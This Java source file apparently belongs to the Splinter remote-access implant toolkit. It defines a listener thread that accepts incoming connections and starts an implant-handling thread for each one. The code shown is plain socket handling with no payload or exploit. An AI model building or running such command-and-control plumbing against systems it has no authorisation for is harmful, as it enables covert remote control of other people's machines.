/**
 * This is the main ServerSocket thread listening for new connections.  Each connection will be thrown into a new terminal thread
 * 
 *  @author Solomon Sonya
 */

package Implant;



import java.io.*;
import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;

import javax.swing.*;
import java.awt.*;

public class Implant_ServerSocket extends Thread implements Runnable
{
	String strMyClassName = this.getName();
	
	public volatile  int svrSocketPort = -1;
	public volatile InetAddress localhost = null;
	public volatile ServerSocket svrSocket = null;
	public volatile String serverAddr ="";
						
	public boolean serverSocketRunning = false; 
	
	public volatile boolean keepServerSocketOpen = true;
	public volatile boolean allow_multiple_connections = true;
	
	public volatile InetAddress bind_address = null;
	
	public Implant_ServerSocket(int prt, boolean allow_mult_connection_mode, InetAddress bind_inet_address)
	{
		try
		{
			Driver.alImplant = new ArrayList<Splinter_IMPLANT>();
			svrSocketPort = prt;
			allow_multiple_connections = allow_mult_connection_mode;
			bind_address = bind_inet_address;
		}
		catch(Exception e)
		{
			Driver.eop("Thread_ServerSocket Constructor", strMyClassName, e, "", true);
		}
		
	}
	
	public void run()
	{
		boolean establishSocket = true;
		
		establishServerSocket(svrSocketPort, bind_address);					
		
		/*******************************************
		 * 
		 * INFINITE WHILE FOR NEW CONNECTIONS!
		 * 
		 ******************************************/
		while(keepServerSocketOpen)
		{
			Socket sckClientSocket = null;
			try
			{
				//in essence, always allow multiple connections.  however, whenever a new one comes in and if we are in only allow one at a time mode, then close the new connection immediately
				
				//forever wait until a new connection is established, once a new connection is received, spawn a new 
				sckClientSocket = svrSocket.accept();
				
				//check if we're only going to allow one connection at a time
				/*if(!this.allow_multiple_connections && Driver.numConnectedImplants > 0)//multiple connections are not allowed --> i.e. only allow single connection
				{
					try	{ sckClientSocket.close();}catch(Exception e){}
					continue;
				}//proceed to accept a connection and throw it into a thread*/
				
				
				//we just got here, new socket is established. bind socket to new thread to correspond to implant
				Splinter_IMPLANT implant = new Splinter_IMPLANT(svrSocketPort, sckClientSocket);
				implant.i_am_a_listener_agent = true;
				implant.start();				
				
				//"link" the thread to the arraylist
				Driver.alImplant.add(implant);
				Driver.numConnectedImplants++;
												
				//that is all, loop back to the top to wait to accept the next connection
			}
						
			
			catch(SocketException se)
			{
				Driver.sop("ServerSocket is closed. I am terminaing waiting for connections.  Please re-establish ServerSocket if necessary");
				keepServerSocketOpen = false;
				break;
			}
			
			
			catch(Exception e)
			{
				Driver.eop("ServerSocket thead run", strMyClassName, e, "Not a problem. Perhaps remote agent disconnected. Please re-establish the server socket if necessary", false);
				//keepServerSocketOpen = false;
			}
			
			//We break out when the server socket is no longer running. indicate accordingly
			
		}
		
		
	}
	
	public boolean establishServerSocket(int prt, InetAddress bind_IP_Addr)
	{
		try
		{
			serverSocketRunning = false;
			keepServerSocketOpen = false;
			
			//Establish ServerSocket and bind to Port
			try
			{
				//svrSocket = new ServerSocket(prt);
				
				if(bind_IP_Addr == null)
				{
					Driver.sop("Bind IP Address not specified, attempting to establish serversocket on default interface...");
					svrSocket = new ServerSocket(prt);
				}
				else
				{
					svrSocket = new ServerSocket(prt, 0, bind_IP_Addr);
				}				
				
			}
			catch(SocketException se)
			{
				Driver.sop("Unable to bind to port " + prt + ". ServerSocket is Closed. You must try another port in order to continue");
				System.exit(0);
				return false;
			}
			
			//Set the IP address
			/*localhost = InetAddress.getLocalHost();
						
			
			String success = 	" * * * * * ServerSocket Established at " +Driver.getTimeStamp_Without_Date() + " * * * * *\n" + 
								"Server HostName: " + localhost.getHostName() + "\n" + 
								"Server IP: " + localhost.getHostAddress() + "\n" + 
								"Listening for Implants on Port: " + prt;*/
			
			localhost = svrSocket.getInetAddress();
						
			
			//String success = 	" [" + Driver.getTimeStamp_Without_Date()  + "] Server Socket Established. Server HostName: " + localhost.getHostName() + "  Listening for connections across " + localhost + " - PORT: " + prt; 
			String success = 	"Server Socket Established across " + localhost + " : " + prt;
								
			
			Driver.sop(success);
			
			keepServerSocketOpen = true;
									
			serverSocketRunning = true;
			
			/**
			 * solo, think of resolving external ip using the following code: //add button
			 * 
			 * URL myIP = new URL("http://checkip.amazonaws.com");
			 * BufferedReader brURL = new BufferedReader(new InputStreamReam(myIP.openStream()));
			 * String line = brURL.readLine();
			 * brURL.close(); 
			 * 
			 */
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("establishServerSocket", strMyClassName, e, "Unable to maintain established server socket", true);
		}
		
		return false;
	}
	
}
